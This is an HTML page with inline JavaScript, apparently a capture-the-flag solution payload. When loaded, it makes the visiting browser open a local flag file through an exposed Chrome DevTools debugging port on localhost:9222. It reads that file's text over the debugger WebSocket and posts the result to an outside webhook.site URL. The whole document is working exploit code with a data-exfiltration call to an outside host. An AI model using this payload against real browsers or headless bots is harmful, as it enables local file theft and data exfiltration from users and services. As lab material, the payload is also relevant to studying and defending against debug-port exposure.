<!doctype html>
<html>
<body>
<script>
(async () => {
  const hook = "https://webhook.site/a66ae4f5-fdf1-46dd-acff-05d5c108df64";
  const report = text => fetch(hook, {
    method: "POST",
    mode: "no-cors",
    body: String(text)
  });

  try {
    const response = await fetch(
      "http://localhost:9222/json/new?file:///challenge/flag-53035d3cba0664dfac37ff64b6e0f86e",
      { method: "PUT" }
    );

    const page = await response.json();
    const ws = new WebSocket(page.webSocketDebuggerUrl);

    ws.onopen = () => {
      ws.send(JSON.stringify({
        id: 1,
        method: "Runtime.evaluate",
        params: {
          expression: "document.body.innerText",
          returnByValue: true
        }
      }));
    };

    ws.onmessage = event => {
      const message = JSON.parse(event.data);
      if (message.id === 1) {
        report("Page text: " +
          JSON.stringify(message.result?.result?.value ??
                         message.result?.exceptionDetails ??
                         message));
        ws.close();
      }
    };

    ws.onerror = () => report("WebSocket connection failed");
  } catch (error) {
    report("Error: " + String(error));
  }
})();
</script>
</body>
</html>
